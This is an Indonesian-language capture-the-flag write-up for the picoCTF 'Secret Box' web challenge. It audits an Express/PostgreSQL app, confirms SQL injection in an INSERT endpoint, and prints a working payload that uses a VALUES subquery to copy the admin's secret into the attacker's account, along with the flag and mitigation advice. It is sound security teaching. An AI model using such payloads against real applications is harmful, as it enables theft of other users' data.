# Secret Box

| Informasi | Detail |
| --- | --- |
| Platform / Event | picoCTF 2026 (via CyLab Security Academy) |
| Kategori | Web Exploitation |
| Tingkat Kesulitan | Medium |
| Status | Solved |

## Deskripsi

Challenge `Secret Box` menyajikan aplikasi web "Secret Vault" — sebuah penyimpanan
rahasia pribadi dengan tagline *It's perfectly secure—only you can see what's inside*.
Deskripsi challenge menantang: *Or can you? Try uncovering the admin's secret.* Tujuannya
adalah membaca isi secret milik user `admin`, yang tidak dapat diakses melalui UI karena
setiap pengguna hanya melihat secret miliknya sendiri.

## Informasi Awal

- Instance web dapat diakses melalui browser, dengan port yang berubah setiap instance
  (`62221`, kemudian `49443` setelah restart):

  ```text
  http://candy-mountain.picoctf.net:62221
  ```

- Halaman utama menyediakan tombol `Log In` dan `Sign Up`.
- Challenge menyediakan unduhan source code dengan struktur:

  ```text
  source/
  ├── app/
  │   ├── Dockerfile
  │   └── src/
  │       ├── db.js
  │       ├── handler.js
  │       ├── server.js
  │       └── views/ (index, login, signup, create_secret, my_secrets .ejs)
  ├── db/
  │   ├── Dockerfile
  │   └── initdb.sql
  └── docker-compose.yml
  ```

- Hint resmi challenge: `How to use sql injection`.

## Tools

- Browser (Chrome/Edge)
- Read source code (static analysis)
- curl (opsional untuk uji cepat)

## Analisis

### 1. Audit source code

Aplikasi adalah Express + EJS dengan PostgreSQL melalui `knex`. Poin penting dari
`server.js`:

- Endpoint `POST /login`, `POST /signup`, dan middleware auth **sudah aman** karena
  memakai parameterized query:

  ```js
  `SELECT * FROM users WHERE username = ? AND password = ? LIMIT 1`
  ```

- Namun `POST /secrets/create` **menyusun query dengan string concatenation**:

  ```js
  const content = req.body.content;
  const query = await db.raw(
      `INSERT INTO secrets(owner_id, content) VALUES ('${userId}', '${content}')`
  );
  ```

  `content` adalah input bebas dari textarea form "Create New Secret", disisipkan
  langsung ke dalam statement SQL → **SQL Injection pada konteks INSERT**.

- `GET /` (halaman My Secrets) menampilkan semua baris tabel `secrets` dengan
  `owner_id = req.userId`, sehingga baris apa pun milik akun kita akan dirender
  kembali ke browser — ini channel pembacaan hasil (data exfiltration).

### 2. Peta database

Dari `initdb.sql` dan `db.js`:

```sql
CREATE TABLE secrets (
    id text PRIMARY KEY DEFAULT gen_random_uuid(),
    owner_id text NOT NULL REFERENCES users(id),
    content text NOT NULL,
    created_at timestamptz NOT NULL DEFAULT now()
);

INSERT INTO users(id, username, password)
VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'admin', 'fake_password');

INSERT INTO secrets(owner_id, content)
VALUES ('e2a66f7d-2ce6-4861-b4aa-be8e069601cb', 'picoCTF{fake_flag}');
```

- Secret milik `admin` (id tetap `e2a66f7d-...`) berisi flag — di production, `db.js`
  memperbarui baris ini dengan `process.env.FLAG` saat startup.
- `secrets.owner_id` punya foreign key ke `users(id)` → baris yang di-inject harus
  memakai `owner_id` milik user yang benar-benar ada.

### 3. Konfirmasi injeksi

Mendaftar akun baru, login, lalu submit content berupa satu tanda kutip `'` pada form
Create New Secret menghasilkan error page yang membocorkan query lengkap:

```text
error: INSERT INTO secrets(owner_id, content) VALUES ('fb832c0b-7ad2-4a0c-af33-192245a22497', ''') - unterminated quoted string at or near "'''"
```

Tiga informasi berharga sekaligus: injeksi terkonfirmasi, konteksnya INSERT PostgreSQL,
dan `user_id` session kita terlihat langsung di pesan error.

### 4. Menyusun payload

Template server:

```text
INSERT INTO secrets(owner_id, content) VALUES ('<uuid>', '[CONTENT]')
```

Payload dibangun dengan tiga langkah: (1) tutup string dengan `'`, (2) tambahkan
baris values kedua yang pemiliknya akun kita dan content-nya **subquery** yang membaca
secret milik admin, (3) netralkan sisa `')` template dengan komentar `--`:

```text
isi-bebas'), ('<uuid-session-sekarang>', (SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb')) --
```

Query hasil concat menjadi:

```sql
INSERT INTO secrets(owner_id, content)
VALUES ('<uuid>', 'isi-bebas'),
       ('<uuid>', (SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-...'))
--')
```

PostgreSQL mengizinkan subquery di dalam `VALUES`, sehingga isi secret admin (flag)
dievaluasi saat INSERT dan tersimpan sebagai baris milik akun kita — yang kemudian
tampil di halaman My Secrets.

## Langkah Penyelesaian

### 1. Daftar dan login

Buat akun baru lewat `/signup`, lalu login lewat `/login`.

### 2. Konfirmasi injeksi dengan satu tanda kutip

Submit `'` pada field content. Error page mengonfirmasi SQLi sekaligus membocorkan
`user_id` session.

### 3. Eksekusi payload

Submit payload berikut (uuid diambil dari error terbaru, bukan dari sesi lama):

```text
isi-bebas'), ('fb832c0b-7ad2-4a0c-af33-192245a22497', (SELECT content FROM secrets WHERE owner_id = 'e2a66f7d-2ce6-4861-b4aa-be8e069601cb')) --
```

### 4. Kendala: foreign key violation setelah restart instance

Percobaan pertama memakai uuid dari error sesi lama (`a365d0d2-...`) padahal instance
di-restart (port berubah `62221` → `49443`). Database baru tidak lagi memiliki user
lama, sehingga `secrets.owner_id REFERENCES users(id)` menolak barisnya (foreign key
violation). Pelajarannya: **selalu ambil uuid dari error/session terbaru**, karena id
dinamis tidak stabil antar instance.

### 5. Baca flag di My Secrets

Setelah payload dieksekusi dengan uuid yang benar, buka `GET /`. Baris hasil injeksi
muncul di halaman My Secrets berisi flag:

```text
picoCTF{sql_1nject10n_31c1577b}
```

## Flag

```text
picoCTF{sql_1nject10n_31c1577b}
```

## Pembelajaran

- Parameterized query (`?` placeholder) hanya aman jika dipakai **konsisten**; satu
  endpoint yang menyusun query via string concatenation cukup untuk membobol seluruh
  database.
- Konteks injeksi menentukan tekniknya: SQLi pada `INSERT ... VALUES` berbeda dari
  login bypass pada `SELECT WHERE` — di sini kuncinya menutup string, menambah baris
  values kedua dengan subquery, lalu mengomentari sisa template dengan `--`.
- PostgreSQL mengizinkan subquery di dalam `VALUES`, sehingga INSERT bisa dipakai
  sebagai saluran pembacaan data: data rahasia "dipindahkan" menjadi milik akun
  penyerang, lalu dibaca lewat UI yang sah.
- Error page adalah aset recon: query lengkap dan `user_id` session terbocor. Error
  juga mengajarkan constraint skema (foreign key violation) tanpa perlu akses langsung
  ke database.
- Pada CTF dengan instance dinamis, id/port berubah setiap restart — ambil ulang nilai
  dinamis (uuid session) dari sumber terbaru sebelum menembakkan payload.
- Mitigasi: gunakan parameterized query di semua endpoint (termasuk INSERT), jangan
  tampilkan error database mentah ke pengguna, dan terapkan prinsip hak akses minimum
  di level query (misalnya `WITH CHECK` / validasi kepemilikan).

## Referensi

- [picoCTF](https://picoctf.org/)
- [CyLab Security Academy](https://learn.cylabacademy.org/)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL-Injection-Prevention-Cheat-Sheet.html)
- [PostgreSQL Documentation — INSERT](https://www.postgresql.org/docs/current/sql-insert.html)
